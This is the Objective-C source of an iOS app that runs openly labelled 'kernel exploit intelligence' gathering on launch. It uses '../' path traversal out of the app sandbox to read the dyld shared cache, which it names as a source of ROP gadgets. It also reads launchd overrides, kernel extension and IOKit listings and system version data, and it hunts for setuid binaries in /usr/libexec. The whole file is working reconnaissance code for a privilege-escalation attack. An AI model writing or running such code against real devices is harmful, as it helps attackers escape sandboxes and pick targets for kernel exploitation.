#import <UIKit/UIKit.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.text = @"Kernel Reconnaissance\n\n";
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self recon];
    });
    
    return YES;
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:[msg stringByAppendingString:@"\n"]];
    });
}

- (NSString *)traverse:(NSString *)path {
    NSString *home = NSHomeDirectory();
    NSString *traversal = [@"../../../../../../" stringByAppendingString:path];
    return [home stringByAppendingPathComponent:traversal];
}

- (void)recon {
    [self log:@"[1] Gathering kernel exploit intelligence...\n"];
    
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // 1. Find dyld shared cache (ROP gadgets)
    NSArray *dyldPaths = @[
        @"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
        @"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64",
        @"/private/var/db/dyld/dyld_shared_cache_arm64e",
    ];
    
    [self log:@"[2] Looking for dyld shared cache..."];
    for (NSString *path in dyldPaths) {
        NSString *fullPath = [self traverse:path];
        NSDictionary *attrs = [fm attributesOfItemAtPath:fullPath error:nil];
        if (attrs) {
            NSString *msg = [NSString stringWithFormat:@"*** FOUND: %@ (%llu bytes)", path, [attrs fileSize]];
            [self log:msg];
        }
        usleep(50000);
    }
    
    // 2. Find launchd overrides (disabled services)
    [self log:@"\n[3] Reading launchd overrides..."];
    NSString *overridesPath = [self traverse:@"/private/var/db/launchd.db/com.apple.launchd/overrides.plist"];
    NSData *overridesData = [fm contentsAtPath:overridesPath];
    if (overridesData) {
        NSDictionary *overrides = [NSPropertyListSerialization propertyListWithData:overridesData options:0 format:nil error:nil];
        if (overrides) {
            for (NSString *key in overrides) {
                NSString *msg = [NSString stringWithFormat:@"  Service: %@ = %@", key, overrides[key]];
                [self log:msg];
            }
        }
    } else {
        [self log:@"  overrides.plist not accessible"];
    }
    
    // 3. Find kernel extensions
    [self log:@"\n[4] Enumerating kernel extensions..."];
    NSString *kextPath = [self traverse:@"/System/Library/Extensions"];
    NSArray *kexts = [fm contentsOfDirectoryAtPath:kextPath error:nil];
    if (kexts) {
        for (NSString *kext in kexts) {
            if ([kext hasSuffix:@".kext"]) {
                NSString *msg = [NSString stringWithFormat:@"  KEXT: %@", kext];
                [self log:msg];
            }
        }
    } else {
        [self log:@"  Extensions directory not accessible"];
    }
    
    // 4. Find vulnerable drivers (IOKit families)
    [self log:@"\n[5] Checking IOKit personalities..."];
    NSString *iokitPath = [self traverse:@"/System/Library/Extensions/IOKit.kext/Contents/PlugIns"];
    NSArray *iokitPlugins = [fm contentsOfDirectoryAtPath:iokitPath error:nil];
    if (iokitPlugins) {
        for (NSString *plugin in iokitPlugins) {
            NSString *msg = [NSString stringWithFormat:@"  IOKit: %@", plugin];
            [self log:msg];
        }
    }
    
    // 5. Read system version
    [self log:@"\n[6] System info..."];
    NSString *versionPath = [self traverse:@"/System/Library/CoreServices/SystemVersion.plist"];
    NSData *versionData = [fm contentsAtPath:versionPath];
    if (versionData) {
        NSDictionary *version = [NSPropertyListSerialization propertyListWithData:versionData options:0 format:nil error:nil];
        if (version) {
            NSString *msg = [NSString stringWithFormat:@"  Product: %@ %@ (%@)", 
                version[@"ProductName"], version[@"ProductVersion"], version[@"ProductBuildVersion"]];
            [self log:msg];
        }
    }
    
    // 6. Find setuid binaries in /usr/libexec
    [self log:@"\n[7] Scanning /usr/libexec for setuid binaries..."];
    NSString *libexecPath = [self traverse:@"/usr/libexec"];
    NSArray *libexecContents = [fm contentsOfDirectoryAtPath:libexecPath error:nil];
    if (libexecContents) {
        for (NSString *item in libexecContents) {
            NSString *fullPath = [libexecPath stringByAppendingPathComponent:item];
            NSDictionary *attrs = [fm attributesOfItemAtPath:fullPath error:nil];
            if (attrs) {
                NSNumber *perms = attrs[NSFilePosixPermissions];
                if (perms && ([perms intValue] & 04000)) { // S_ISUID
                    NSString *msg = [NSString stringWithFormat:@"*** SETUID: %@ (perms: %o)", item, [perms intValue]];
                    [self log:msg];
                }
            }
        }
    }
    
    [self log:@"\n[8] Recon complete"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
